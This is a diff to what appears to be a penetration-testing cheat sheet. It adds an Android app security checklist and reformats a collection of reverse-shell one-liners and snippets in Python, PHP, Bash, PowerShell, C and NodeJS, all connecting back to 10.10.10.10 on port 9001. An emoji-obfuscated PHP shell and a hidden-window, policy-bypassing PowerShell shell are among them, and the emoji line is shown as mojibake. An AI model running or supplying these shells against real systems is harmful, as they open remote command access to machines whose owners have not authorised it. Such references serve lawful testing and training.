@@ -68,6 +68,35 @@ Start with automated tools to search for low hanging fruits
 
 <details><summary> <b>MOBILE</b> </summary><blockquote>
   <details><summary>Android</summary><blockquote>
+    ### Checklist
+* unzip -d and apktool -d both (different outputs at time)
+    
+* check for /assets and /res/raw (api keys, encryption keys)
+    
+* sensitive files and external storage (world readable  & writeable)
+    
+* executables & log files on external storage
+    
+* look at manifest (WRITE_EXTERNAL_STORAGE)., grep for "getExternal"
+    
+* check for installed package "vnd.android.package-archive" (they want to install something)
+    
+* hidden directories (.folder)
+    
+* api keys saved as bytearray to obfuscate
+    
+* identify crypto & understand it
+    
+* webSettings.setJavaScriptEnabled(True); means we might be able to XSS
+    
+* interesting options: "setAllowContent", "setAllowFileAccess", "setAllowFileAccessFromFileURILS", "setAllowUniversalAccessFromFileURLs", "setJavaScriptEnabled", "setPluginState", "setSavePassword"
+    
+* overwriting ssl errors :facepalm:
+    
+* xss might allow to call Runtime.getRuntime().exec() (CVE-2012-6636) <= Api17
+                                                                           
+* use Mitm Proxy (mitm.it has the cert)
+                                                                           
     :smile:
   </blockquote></details>
   <details><summary>iOS</summary><blockquote>
@@ -77,7 +106,7 @@ Start with automated tools to search for low hanging fruits
 
 <br/>
 
-<details><summary> <b>NIX</b> </summary><blockquote>
+<details><summary> <b>*NIX</b> </summary><blockquote>
   <details><summary>Exploitation</summary><blockquote>
     :smile:
   </blockquote></details>
@@ -137,26 +166,33 @@ Start with automated tools to search for low hanging fruits
 <br/>
 <details><summary> <b>SHELLS</b> </summary><blockquote>
   <details><summary>Reverse Shells</summary><blockquote>
-    #### Python
+#### Python
 ```python
   python -c 'import pty;pty.spawn("/bin/bash")';
 ```
-```python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+    
+#### Python
+```python
+    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
 ```
-    #### PHP
+    
+#### PHP
 ```php
     php -r '$sock=fsockopen("10.10.10.10",9001);system("sh <&3 >&3 2>&3");'
 ```
-    #### Bash
+    
+#### Bash
 ```bash
     sh -i >& /dev/tcp/10.10.10.10/9001 0>&1
  ```
-    #### PHP Emoji
- ```php
+    
+#### PHP Emoji
+```php
     php -r '$ð="1";$ð="2";$ð="3";$ð="4";$ð="5";$ð="6";$ð="7";$ð="8";$ð="9";$ð="0";$ð¤¢=" ";$ð¤="<";$ð¤ =">";$ð±="-";$ðµ="&";$ð¤©="i";$ð¤=".";$ð¤¨="/";$ð¥°="a";$ð="b";$ð¶="i";$ð="h";$ð="c";$ð¤£="d";$ð="e";$ð="f";$ð="k";$ð="n";$ð="o";$ð="p";$ð¤="s";$ð="x";$ð = $ð. $ð¤. $ð. $ð. $ð. $ð. $ð. $ð. $ð;$ð = "10.10.10.10";$ð» = 9001;$ð = "sh". $ð¤¢. $ð±. $ð¤©. $ð¤¢. $ð¤. $ðµ. $ð. $ð¤¢. $ð¤ . $ðµ. $ð. $ð¤¢. $ð. $ð¤ . $ðµ. $ð;$ð¤£ =  $ð($ð,$ð»);$ð½ = $ð. $ð. $ð. $ð;$ð½($ð);'
- ```
-    #### C
-   ```c
+```
+    
+#### C
+```c
     #include <stdio.h>
 #include <sys/socket.h>
 #include <sys/types.h>
@@ -185,14 +221,16 @@ int main(void){
 
     return 0;       
 }
-   ```
+```
     
-    ### Powershell
+#### Powershell
+    
 ```powershell
     powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
  ```
-   #### NodeJS
-    ```javascript
+
+#### NodeJS
+```javascript
     (function(){
     var net = require("net"),
         cp = require("child_process"),
@@ -205,7 +243,7 @@ int main(void){
     });
     return /a/; // Prevents the Node.js application from crashing
 })();
-    ```
+```
     
     
     :smile:
